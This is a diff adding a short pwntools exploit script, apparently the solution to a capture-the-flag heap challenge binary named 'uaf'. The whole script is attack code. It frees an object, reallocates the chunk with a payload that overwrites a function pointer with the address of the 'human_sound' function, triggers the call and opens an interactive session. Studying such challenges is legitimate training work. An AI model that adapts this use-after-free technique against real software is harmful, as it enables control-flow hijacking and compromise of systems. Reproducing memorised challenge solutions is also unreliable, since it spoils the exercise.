@@ -1,0 +1,32 @@
+from pwn import *
+
+p = process("./uaf")
+'''
+p = gdb.debug("./uaf", gdbscript = 
+b *main + 201
+b *main + 225
+)
+'''
+e = ELF("./uaf")
+
+win = e.symbols['human_sound']
+
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"Index: ", b"1")
+p.sendlineafter(b"> ", b"1")
+p.sendlineafter(b"Name size: ", b"8")
+p.sendlineafter(b"Name: ", b"AAAAAAA")
+
+p.sendlineafter(b"> ", b"3")
+p.sendlineafter(b"Index: ", b"1")
+
+p.sendlineafter(b"> ", b"2")
+p.sendlineafter(b"Index: ", b"1")
+p.sendlineafter(b"Name size: ", b"16")
+payload = b"A" * 0x8 + p64(win)[:-1:]
+p.sendlineafter(b"Name: ", payload)
+
+p.sendlineafter(b"> ", b"4")
+p.sendlineafter(b"Index: ", b"1")
+
+p.interactive()
